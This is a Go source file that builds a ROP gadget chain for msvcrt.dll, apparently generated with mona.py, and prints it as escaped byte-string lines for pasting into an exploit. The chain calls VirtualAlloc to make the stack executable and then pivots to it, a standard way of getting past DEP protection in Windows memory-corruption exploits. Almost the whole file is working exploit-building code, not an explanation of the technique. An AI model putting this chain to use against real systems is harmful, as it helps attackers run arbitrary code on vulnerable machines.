package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"strings"
)

func create_rop_chain() string {
	// rop chain generated with mona.py - www.corelan.be
	rop_gadgets := []uint32 {
		// working rop #1
		//0x77c31c54,  // POP EBP // RETN [msvcrt.dll]
		//0x77c31c54,  // skip 4 bytes [msvcrt.dll]
		//0x77c43416,  // POP EBX // RETN [msvcrt.dll]
		//0x77c49ea4,  // INC EBX // RETN 0x04 [msvcrt.dll]
		//0x77c49ea4,  // INC EBX // RETN 0x04 [msvcrt.dll]
		//0x41414141,  // Filler (RETN offset compensation)
		//0x77c2b860,  // POP EAX // RETN [msvcrt.dll]
		//0x41414141,  // Filler (RETN offset compensation)
		//0xa1bf4fcd,  // put delta into eax (-> put 0x00001000 into edx)
		//0x77c28081,  // ADD EAX,5E40C033 // RETN [msvcrt.dll]
		//0x77c48f9c,  // XCHG EAX,EDX // RETN [msvcrt.dll]
		//0x77c3e372,  // POP EAX // RETN [msvcrt.dll]
		//0xa2f7bab5,  // put delta into eax (-> put 0x00000040 into ecx)
		//0x77c21556,  // ADD EAX,5D08458B // RETN [msvcrt.dll]
		//0x77c49f38,  // XCHG EAX,ECX // RETN [msvcrt.dll]
		//0x77c1e93d,  // POP EDI // RETN [msvcrt.dll]
		//0x77c37a42,  // RETN (ROP NOP) [msvcrt.dll]
		//0x77c2a18d,  // POP ESI // RETN [msvcrt.dll]
		//0x77c1aacc,  // JMP [EAX] [msvcrt.dll]
		//0x77c11d16,  // POP EAX // RETN [msvcrt.dll]
		//0x77c0110c,  // ptr to &VirtualAlloc() [IAT msvcrt.dll]
		//0x77c048a1,  // PUSHAD // RETN [msvcrt.dll]
		//0x77c49eac,  // ptr to 'push esp // ret 0x04' [msvcrt.dll]

		// working rop #2
		0x77c1083c,  // POP EBP // RETN [msvcrt.dll]
		0x77c1083c,  // skip 4 bytes [msvcrt.dll]
		0x77c450d7,  // POP EBX // RETN [msvcrt.dll]
		0x77c49ea4,  // INC EBX // RETN 0x04 [msvcrt.dll]
		0x77c49ea4,  // INC EBX // RETN 0x04 [msvcrt.dll]
		0x41414141,  // Filler (RETN offset compensation)
		0x77c421f7,  // POP EAX // RETN [msvcrt.dll]
		0x41414141,  // Filler (RETN offset compensation)
		0xa1bf4fcd,  // put delta into eax (-> put 0x00001000 into edx)
		0x77c28081,  // ADD EAX,5E40C033 // RETN [msvcrt.dll]
		0x77c48f9c,  // XCHG EAX,EDX // RETN [msvcrt.dll]
		0x77c3e0ba,  // POP EAX // RETN [msvcrt.dll]
		0xa2f7bab5,  // put delta into eax (-> put 0x00000040 into ecx)
		0x77c21556,  // ADD EAX,5D08458B // RETN [msvcrt.dll]
		0x77c49f38,  // XCHG EAX,ECX // RETN [msvcrt.dll]
		0x77c36116,  // POP EDI // RETN [msvcrt.dll]
		0x77c37a42,  // RETN (ROP NOP) [msvcrt.dll]
		0x77c36f30,  // POP ESI // RETN [msvcrt.dll]
		0x77c1aacc,  // JMP [EAX] [msvcrt.dll]
		0x77c3e372,  // POP EAX // RETN [msvcrt.dll]
		0x77c0110c,  // ptr to &VirtualAlloc() [IAT msvcrt.dll]
		0x77c048a1,  // PUSHAD // RETN [msvcrt.dll]
		0x77c49eac,  // ptr to 'push esp // ret 0x04' [msvcrt.dll]
	};

	buf := new(bytes.Buffer)
	for _, v := range rop_gadgets {
		err := binary.Write(buf, binary.LittleEndian, v)
		if err != nil {
			fmt.Println("binary.Write failed:", err)
		}
	}

	return string(buf.Bytes())
}

func main(){
	ropBytes := create_rop_chain()
	lenRopBytes := len(ropBytes)
	countPerLine := 13
	appendix := lenRopBytes % countPerLine
	length := lenRopBytes - appendix
	code := "rop := \"\"\n"
	for i:=0; i<length; i+= countPerLine {
		ropPart := strings.Replace(fmt.Sprintf(" % x", ropBytes[i:(i+ countPerLine)]), " ", "\\x", -1)
		code += fmt.Sprintf("rop += \"%v\"\n", ropPart)
	}
	if appendix > 0 {
		ropPart := strings.Replace(fmt.Sprintf(" % x", ropBytes[lenRopBytes-appendix:]), " ", "\\x", -1)
		code += fmt.Sprintf("rop += \"%v\"\n", ropPart)
	}

	fmt.Print(code)
}